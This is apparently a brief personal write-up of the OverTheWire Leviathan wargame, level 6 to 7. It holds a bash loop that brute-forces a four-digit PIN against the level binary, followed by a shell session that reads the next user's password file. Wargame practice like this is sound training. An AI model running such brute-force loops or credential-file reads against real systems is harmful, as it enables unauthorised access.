I had to use a shellcode because the python was not working (maybe for the translation from python to shell)

--brute.sh
for i in {0000..9999}
do
/home/leviathan6/leviathan6 $i
done

chmod 777 brute.sh

waaaaaaittttttttt

$ whoami
leviathan7
$ cat /etc/levithan_pass/leviathan7
cat: /etc/levithan_pass/leviathan7: No such file or directory
$ cat /etc/leviathan_pass/leviathan7
